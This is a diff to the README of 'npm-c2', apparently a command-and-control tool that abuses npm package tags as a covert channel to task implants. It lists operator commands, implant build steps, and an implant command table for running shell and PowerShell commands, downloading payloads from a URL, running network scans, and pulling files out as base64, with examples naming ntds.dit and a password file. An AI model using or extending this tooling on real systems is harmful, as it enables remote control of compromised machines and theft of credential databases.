@@ -75,25 +75,22 @@ Requires Python 3.8+. Only dependency is `requests`.
 ## Quick Reference
 
 ```
-# operator
-npm-c2 operator -p <pkg> -t <tok> task --cmd "whoami"
-npm-c2 operator -p <pkg> -t <tok> task --file script.ps1
-npm-c2 operator -p <pkg> -t <tok> poll
-npm-c2 operator -p <pkg> -t <tok> watch
-npm-c2 operator -p <pkg> -t <tok> beacons
-npm-c2 operator -p <pkg> -t <tok> clean
-npm-c2 operator -p <pkg> -t <tok> clean --all
-npm-c2 operator -p <pkg> -t <tok> stats
+# readiness: token, package, write access, tag length, cache behaviour
+npm-c2 doctor -p <pkg> -t <tok>
+
+# operator (interactive is the normal path now)
+npm-c2 operator -p <pkg> -t <tok> shell              # command in, output out
+npm-c2 operator -p <pkg> -t <tok> run "whoami"       # one command, prints result
+npm-c2 operator -p <pkg> -t <tok> run --file s.ps1   # push a script and wait
+npm-c2 operator -p <pkg> -t <tok> task --cmd "whoami"   # queue only
+npm-c2 operator -p <pkg> -t <tok> poll               # dump all results
+npm-c2 operator -p <pkg> -t <tok> watch              # follow results live
+npm-c2 operator -p <pkg> -t <tok> beacons | stats | clean [--all]
 
 # build
 npm-c2 --generate-standalone > implant.py
 npm-c2 --generate-standalone -t <tok> -p <pkg> > implant.py
-npm-c2 obfuscate -p <pkg> -t <tok>
-build.bat
-
-# implant
-python standalone_implant.py -p <pkg> --interval 120
-node.exe -p <pkg> --interval 120
+build.bat <tok> <pkg>
 ```
 
 ## Setup Guide
@@ -238,14 +235,20 @@ Only `latest -> 1.0.0` remains.
 
 | format | example | description |
 |--------|---------|-------------|
-| `shell command` | `whoami` | Executes via subprocess. Returns stdout+stderr. |
-| `exec:<cmd>` | `exec:powershell -enc ...` | Explicit exec prefix. |
-| `dl:<url>:<path>` | `dl:http://server/x.exe:C:\temp\x.exe` | Downloads a file. Creates directories. |
-| `up:<path>` | `up:C:\Users\user\pass.txt` | Reads a file. Returns base64. |
-| `sleep:<sec>` | `sleep:300` | Changes poll interval at runtime. |
-| `exit` | `exit` | Removes all tags. Terminates. |
+| `<anything>` | `whoami` | Runs via the platform shell (`cmd.exe /c`, `/bin/sh -c`) in the persistent working directory. |
+| `ps:<cmd>` | `ps:Get-Process` | PowerShell (`powershell.exe` on Windows, `pwsh` elsewhere). |
+| `cd:<path>` / `cd` | `cd:C:\Windows\Temp` | Changes / prints the working directory. Survives restarts in the state file. |
+| `timeout:<sec>:<cmd>` | `timeout:900:nmap -sV 10.0.0.0/24` | Per-command timeout, up to 3600 s. Default 30 s. |
+| `bg:<cmd>` | `bg:nmap -sV 10.0.0.0/24` | Starts a job and returns at once. |
+| `jobs` / `out:<id>` / `kill:<id>` | `out:j1` | List jobs, read a job's output, terminate it. |
+| `dl:<url>:<path>` | `dl:http://10.0.0.1/x.exe:tool.exe` | Downloads a file. Relative paths resolve against the working directory. |
+| `up:<path>[:<off>[:<len>]]` | `up:C:\Users\u\ntds.dit:0:12000` | Base64 of a file, or of one byte range. Replies are capped at 12000 bytes and marked `+` when there is more. |
+| `sleep:<sec>` | `sleep:300` | Changes the poll interval (floor 10 s). |
+| `exit` | `exit` | Removes the channel's tags and stops. |
 
-Anything without a recognized prefix runs as a shell command.
+Output is capped at 12000 characters with an explicit `[truncated N chars]`
+marker; a non-zero exit is prefixed `[rc=N]`. Replies are chunked across as
+many tags as needed and reassembled by the operator.
 
 ## Protocol
 
